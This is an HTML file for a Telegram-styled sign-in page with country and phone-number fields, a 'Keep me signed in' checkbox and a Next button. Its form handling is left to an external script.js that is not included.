<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Telegram</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <!-- Loading Indicator -->
    <div id="loadingIndicator" style="display: none;">Loading...</div>

    <!-- Login Section -->
    <div class="login-container" id="loginContainer">
        <img id="telegramLogo" src="telegram-logo.png" alt="Telegram Logo" class="logo">
        <h2 class="title">Sign in to Telegram</h2>
        <p class="confirmation-message">Please confirm your country code<br> and enter your phone number.</p>

        <form id="phoneForm">
            <div class="input-container">
                <div class="input-label">Country</div>
                <select id="country" name="country" required>
                    <!-- Country options will be populated dynamically -->
                </select>
            </div>

            <div class="input-container">
                <div class="input-label">Phone Number</div>
                <input 
                    type="tel" 
                    id="phoneNumber" 
                    name="phoneNumber"
                    placeholder="+44 ----- ------"
                    pattern="\+?[0-9]+" 
                    required
                />
            </div>

            <!-- Keep me signed in checkbox -->
            <div class="checkbox-container">
                <input type="checkbox" id="keepSignedIn" name="keepSignedIn" />
                <label for="keepSignedIn" class="keep-signed-in-label">Keep me signed in</label>
            </div>

            <button type="submit" id="submitPhoneNumber">Next</button>
        </form>
        <div id="message"></div>
    </div>

    <!-- Script to run the JavaScript file -->
    <script src="script.js"></script>
</body>
</html>
